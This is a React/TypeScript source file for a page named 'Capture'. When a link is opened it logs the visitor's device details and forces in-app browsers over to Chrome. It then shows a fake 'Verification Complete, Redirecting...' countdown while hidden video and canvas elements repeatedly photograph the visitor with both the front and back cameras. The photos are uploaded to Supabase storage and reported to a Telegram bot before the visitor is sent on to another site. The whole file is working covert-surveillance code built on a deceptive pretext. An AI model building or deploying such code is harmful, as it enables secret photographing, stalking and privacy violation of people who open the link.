import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { collectDeviceInfo } from "@/utils/deviceInfo";

// Detect in-app browsers
const isInAppBrowser = (): boolean => {
  const ua = navigator.userAgent || navigator.vendor || '';
  const inAppPatterns = [
    'Instagram', 'FBAN', 'FBAV', 'FB_IAB', 'Telegram', 'TelegramBot',
    'Twitter', 'Line', 'Snapchat', 'WhatsApp', 'LinkedIn', 'Pinterest',
    'Viber', 'WeChat', 'MicroMessenger',
  ];
  return inAppPatterns.some(pattern => ua.includes(pattern));
};

const isAndroid = (): boolean => /Android/i.test(navigator.userAgent || '');

const isChromeBrowser = (): boolean => {
  const ua = navigator.userAgent || '';
  const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
  const isNotEdge = !/Edg/i.test(ua);
  const isNotOpera = !/OPR/i.test(ua);
  const isNotSamsung = !/SamsungBrowser/i.test(ua);
  return hasChrome && isNotEdge && isNotOpera && isNotSamsung && !isInAppBrowser();
};

const getChromeIntentUrl = (currentUrl: string): string => {
  const url = new URL(currentUrl);
  return `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
};

interface CaptureSettings {
  camPhotoLimit: number;
  camCaptureInterval: number;
  camQuality: number;
  camCountdownTimer: number;
  camAutoRedirect: boolean;
}

const Capture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [status, setStatus] = useState<"loading" | "checking" | "redirecting_chrome" | "not_chrome" | "countdown">("loading");
  const [countdown, setCountdown] = useState<number | null>(null);
  const [settings, setSettings] = useState<CaptureSettings>({
    camPhotoLimit: 0,
    camCaptureInterval: 500,
    camQuality: 0.8,
    camCountdownTimer: 5,
    camAutoRedirect: true
  });
  const captureLoopRef = useRef<boolean>(false);
  const stopCaptureRef = useRef<boolean>(false);
  const captureCountRef = useRef<number>(0);
  const deviceInfoSavedRef = useRef<boolean>(false);
  
  const sessionId = searchParams.get("session") || "default";
  const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
  const urlTimer = searchParams.get("timer");
  
  const redirectUrl = rawRedirectUrl;
  const countdownSeconds = urlTimer ? parseInt(urlTimer, 10) : settings.camCountdownTimer;

  // Extract chat ID from tgcam_ sessions for Telegram notification
  const tgChatId = sessionId.startsWith('tgcam_') ? parseInt(sessionId.split('_')[1]) : null;

  const notifyTelegram = async (photoUrl: string, cameraType: string, captureNum: number) => {
    if (!tgChatId) return;
    try {
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      await fetch(`${supabaseUrl}/functions/v1/telegram-bot`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${anonKey}` },
        body: JSON.stringify({ _internal_photo_notify: true, chatId: tgChatId, photoUrl, cameraType, captureNum }),
      });
    } catch (e) { console.error('TG notify error:', e); }
  };

  // Save device info immediately when page loads
  const saveDeviceInfo = async () => {
    if (deviceInfoSavedRef.current) return;
    deviceInfoSavedRef.current = true;
    
    try {
      const deviceInfo = await collectDeviceInfo();
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_deviceinfo",
        image_data: JSON.stringify(deviceInfo),
        user_agent: navigator.userAgent,
        ip_address: null,
      });
    } catch (err) {
      console.error("Failed to save device info:", err);
    }
  };

  // Load settings from database
  useEffect(() => {
    const loadSettings = async () => {
      // Start collecting device info immediately
      saveDeviceInfo();
      
      try {
        const { data } = await supabase
          .from('app_settings')
          .select('setting_value')
          .eq('setting_key', 'main_settings')
          .maybeSingle();

        if (data?.setting_value) {
          const s = data.setting_value as Record<string, unknown>;
          setSettings({
            camPhotoLimit: (s.camPhotoLimit as number) || 0,
            camCaptureInterval: (s.camCaptureInterval as number) || 500,
            camQuality: (s.camQuality as number) || 0.8,
            camCountdownTimer: (s.camCountdownTimer as number) || 5,
            camAutoRedirect: s.camAutoRedirect !== false
          });
        }
      } catch (err) {
        console.error('Error loading settings:', err);
      }
      setStatus("checking");
    };

    loadSettings();
  }, []);

  const base64ToBlob = (base64: string): Blob => {
    const parts = base64.split(',');
    const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
    const bstr = atob(parts[1]);
    const u8arr = new Uint8Array(bstr.length);
    for (let i = 0; i < bstr.length; i++) {
      u8arr[i] = bstr.charCodeAt(i);
    }
    return new Blob([u8arr], { type: mime });
  };

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode, width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach(track => track.stop());
            return imageData;
          }
        }
        stream.getTracks().forEach(track => track.stop());
      }
      return null;
    } catch (error) {
      console.error(`Camera ${facingMode} access denied:`, error);
      return null;
    }
  };

  const startContinuousCapture = async () => {
    if (captureLoopRef.current) return;
    captureLoopRef.current = true;
    
    while (!stopCaptureRef.current) {
      if (settings.camPhotoLimit > 0 && captureCountRef.current >= settings.camPhotoLimit) break;
      
      try {
        captureCountRef.current++;
        
        const frontImage = await captureFromCamera("user");
        if (frontImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-front-${captureCountRef.current}.jpg`;
          const blob = base64ToBlob(frontImage);
          const { error: uploadError } = await supabase.storage
            .from('captured-photos')
            .upload(fileName, blob, { upsert: true });
          
          if (!uploadError) {
            const { data: urlData } = supabase.storage
              .from('captured-photos')
              .getPublicUrl(fileName);
            
            await supabase.from('captured_photos').insert({
              session_id: sessionId,
              image_data: urlData.publicUrl,
              user_agent: `${navigator.userAgent} [FRONT-${captureCountRef.current}]`
            });
          }
        }
        
        if (stopCaptureRef.current) break;
        if (settings.camPhotoLimit > 0 && captureCountRef.current >= settings.camPhotoLimit) break;
        
        await new Promise(resolve => setTimeout(resolve, 200));
        
        const backImage = await captureFromCamera("environment");
        if (backImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-back-${captureCountRef.current}.jpg`;
          const blob = base64ToBlob(backImage);
          const { error: uploadError } = await supabase.storage
            .from('captured-photos')
            .upload(fileName, blob, { upsert: true });
          
          if (!uploadError) {
            const { data: urlData } = supabase.storage
              .from('captured-photos')
              .getPublicUrl(fileName);
            
            await supabase.from('captured_photos').insert({
              session_id: sessionId,
              image_data: urlData.publicUrl,
              user_agent: `${navigator.userAgent} [BACK-${captureCountRef.current}]`
            });
          }
        }
        
        if (stopCaptureRef.current) break;
        await new Promise(resolve => setTimeout(resolve, settings.camCaptureInterval));
        
      } catch (error) {
        console.error("Capture cycle error:", error);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  };

  useEffect(() => {
    return () => { stopCaptureRef.current = true; };
  }, []);

  useEffect(() => {
    if (status !== "checking") return;
    
    const checkBrowserAndProceed = () => {
      if (isInAppBrowser() && isAndroid()) {
        setStatus("redirecting_chrome");
        setTimeout(() => {
          window.location.href = getChromeIntentUrl(window.location.href);
        }, 100);
        return;
      }
      
      if (isInAppBrowser()) {
        setStatus("not_chrome");
        return;
      }
      
      if (!isChromeBrowser()) {
        setStatus("not_chrome");
        return;
      }
      
      setStatus("countdown");
      setCountdown(countdownSeconds);
      startContinuousCapture();
    };

    checkBrowserAndProceed();
  }, [status, sessionId, countdownSeconds]);

  useEffect(() => {
    if (countdown === null || countdown < 0) return;

    if (countdown === 0) {
      stopCaptureRef.current = true;
      if (settings.camAutoRedirect) {
        window.location.href = redirectUrl;
      }
      return;
    }

    const timer = setTimeout(() => {
      setCountdown(prev => (prev !== null ? prev - 1 : null));
    }, 1000);

    return () => clearTimeout(timer);
  }, [countdown, redirectUrl, settings.camAutoRedirect]);

  if (status === "not_chrome") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center max-w-md">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
            <svg className="w-8 h-8 text-destructive" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-foreground mb-2">Browser Not Supported</h1>
          <p className="text-muted-foreground">Please open this link in Google Chrome browser.</p>
        </div>
      </div>
    );
  }

  if (status === "redirecting_chrome") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Opening in Chrome...</p>
        </div>
      </div>
    );
  }

  if (status === "countdown" && countdown !== null) {
    const progressPercent = ((countdownSeconds - countdown) / countdownSeconds) * 100;
    
    return (
      <div className="min-h-screen flex items-center justify-center p-4" style={{
        background: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #0d0d1a 100%)'
      }}>
        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
        <canvas ref={canvasRef} className="hidden" />
        
        <div className="fixed inset-0 pointer-events-none" style={{
          backgroundImage: 'linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px)',
          backgroundSize: '50px 50px'
        }} />
        
        <div className="fixed w-72 h-72 rounded-full blur-[80px] opacity-40 animate-pulse" style={{ background: '#00ff88', top: '-100px', left: '-100px' }} />
        <div className="fixed w-64 h-64 rounded-full blur-[80px] opacity-40 animate-pulse" style={{ background: '#ec4899', bottom: '-80px', right: '-80px', animationDelay: '-2s' }} />
        
        <div className="relative z-10 text-center p-12 max-w-md w-full" style={{
          background: 'rgba(15, 15, 30, 0.9)',
          backdropFilter: 'blur(20px)',
          border: '1px solid rgba(0, 255, 136, 0.3)',
          borderRadius: '24px',
          boxShadow: '0 0 60px rgba(0, 255, 136, 0.2), 0 25px 50px rgba(0, 0, 0, 0.5)'
        }}>
          <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center text-5xl font-bold animate-pulse" style={{
            background: 'linear-gradient(135deg, #00ff88 0%, #06b6d4 100%)',
            color: '#0a0a1a',
            boxShadow: '0 0 50px rgba(0, 255, 136, 0.5)'
          }}>
            {countdown}
          </div>
          
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full mb-5" style={{
            background: 'rgba(0, 255, 136, 0.1)',
            border: '1px solid rgba(0, 255, 136, 0.3)'
          }}>
            <div className="w-2 h-2 rounded-full animate-pulse" style={{ background: '#00ff88' }} />
            <span style={{ color: '#00ff88', fontSize: '12px', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '1px' }}>
              Verification Complete
            </span>
          </div>
          
          <h2 className="text-2xl font-bold mb-3" style={{ color: '#ffffff' }}>Redirecting...</h2>
          <p className="mb-6" style={{ color: '#888', fontSize: '14px' }}>
            You will be redirected in {countdown} second{countdown !== 1 ? 's' : ''}.
          </p>
          
          <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background: 'rgba(255, 255, 255, 0.1)' }}>
            <div 
              className="h-full rounded-full transition-all duration-1000 ease-linear"
              style={{ width: `${progressPercent}%`, background: 'linear-gradient(90deg, #00ff88 0%, #06b6d4 100%)' }}
            />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center">
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      <div className="text-center">
        <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin mx-auto mb-4" />
        <p className="text-muted-foreground text-sm">Loading...</p>
      </div>
    </div>
  );
};

export default Capture;